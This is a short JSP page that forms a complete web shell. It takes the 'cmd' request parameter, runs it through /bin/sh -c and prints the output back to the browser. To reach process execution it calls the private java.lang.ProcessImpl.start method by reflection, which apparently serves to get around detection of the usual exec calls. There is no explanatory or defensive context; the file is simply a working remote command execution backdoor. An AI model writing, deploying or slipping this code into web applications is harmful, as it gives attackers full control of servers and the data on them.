<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.util.Map" %>
<%!
    public static InputStream reflect(String cmd) throws Exception {
        InputStream inputStream = null;

        String[] cmds = new String[]{"/bin/sh", "-c", cmd};
        Class<?> cls = Class.forName("java.lang.ProcessImpl");
        Method method = cls.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
        method.setAccessible(true);
        Process e = (Process) method.invoke(null, cmds, null, ".", null, true);
        inputStream = e.getInputStream();

        return inputStream;
    }

    public static String scanner(InputStream inputStream) {
        return new Scanner(inputStream).useDelimiter("\\A").next();
    }
%>

<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        out.println(scanner(reflect(cmd)));
    }
%>